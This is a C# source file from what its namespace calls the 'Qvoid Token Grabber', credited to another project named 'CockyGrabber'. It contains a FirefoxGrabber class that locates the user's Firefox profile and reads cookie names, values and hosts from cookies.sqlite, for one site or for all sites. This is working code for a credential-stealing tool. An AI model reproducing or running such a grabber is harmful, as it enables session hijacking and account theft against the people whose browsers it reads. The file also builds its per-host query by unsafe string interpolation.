using System;
using System.Collections.Generic;
using System.IO;

//https://github.com/bytixo/CockyGrabber thx u saved me a lot <3.

namespace Qvoid_Token_Grabber.PasswordGrabbers
{
    class FirefoxGrabber
    {
        public string FirefoxProfilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
        public string FirefoxCookiePath { get; private set; } // can't make this constant because firefox profiles are made of random chars

        public FirefoxGrabber()
        {
            if (!Directory.Exists(FirefoxProfilesPath))
                return;

            foreach (string folder in Directory.GetDirectories(FirefoxProfilesPath))
                if (folder.Contains("default-release"))
                    FirefoxCookiePath = folder + @"\cookies.sqlite";
        }

        public List<Cookie> GetCookiesByHostname(string hostName)
        {
            List<Cookie> cookies = new List<Cookie>();
            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,value,host FROM moz_cookies WHERE host = '{hostName}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            HostName = reader.GetString(2),
                            Name = reader.GetString(0),
                            Value = reader.GetString(1)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }
        public List<Cookie> GetAllCookies()
        {
            try
            {
                List<Cookie> cookies = new List<Cookie>();

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT name,value,host FROM moz_cookies";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Cookie()
                            {
                                HostName = reader.GetString(2),
                                Name = reader.GetString(0),
                                Value = reader.GetString(1)
                            });
                        }
                    }
                    conn.Close();
                }
                return cookies;
            }
            catch { return null; }
        }
    }
}
